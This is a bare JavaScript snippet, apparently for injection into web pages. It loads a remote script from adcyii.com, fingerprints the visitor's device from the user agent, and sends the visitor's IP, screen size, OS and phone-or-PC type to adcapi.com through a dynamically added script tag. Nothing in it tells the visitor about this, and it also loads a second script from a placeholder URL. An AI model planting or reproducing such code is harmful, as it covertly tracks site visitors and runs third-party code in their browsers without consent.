
        let scriptr = document.createElement('script');
        scriptr.src = 'http://adcyii.com/statics/themes/admin/adverjs/mobile-detect.js';
        scriptr.id = 'adverr'
        scriptr.type = 'text/javascript'
        document.getElementsByTagName('head')[0].appendChild(scriptr);
        
        window.onload = function(){
        function browserRedirect() {
        var sUserAgent = navigator.userAgent.toLowerCase();
        var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
        var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
        var bIsMidp = sUserAgent.match(/midp/i) == "midp";
        var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
        var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
        var bIsAndroid = sUserAgent.match(/android/i) == "android";
        var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
        var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
        // document.writeln("您的浏览设备为：");
        if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
         return "phone";
        } else {
             return "pc";
        }
    }
        var phone_pc =   browserRedirect();
       
        var json = {"0":"1111111","1":"222"};
        var randomNum = Math.round(Math.random() * 0);
        var  url = json[randomNum];
        let script = document.createElement('script');
        script.src = url
        script.id = 'adver'
        script.type = 'text/javascript'
        document.getElementsByTagName('head')[0].appendChild(script);
        
        
        var device_type = navigator.userAgent;//获取userAgent信息
        var md = new MobileDetect(device_type);//实例化mobile-detect
        var os = md.os();//获取系统
        var model = "";
    if (os == "iOS") {//ios系统的处理
        os = md.os() + md.version("iPhone");
        model = md.mobile();
    } else if (os == "AndroidOS") {//Android系统的处理

        os = md.os() + md.version("Android");
    }
        
        let scripts = document.createElement('script');
        scripts.src = 'http://adcapi.com/statis/thestal?admin_id=24&admin_name=6&ip='+returnCitySN.cip+
        "&phone_size="+window.screen.height+'X'+window.screen.width+"&phone_model="+os+"&phone_pc="+phone_pc;
        scripts.id = 'adver'
        scripts.type = 'text/javascript'
        document.getElementsByTagName('head')[0].appendChild(scripts);
            };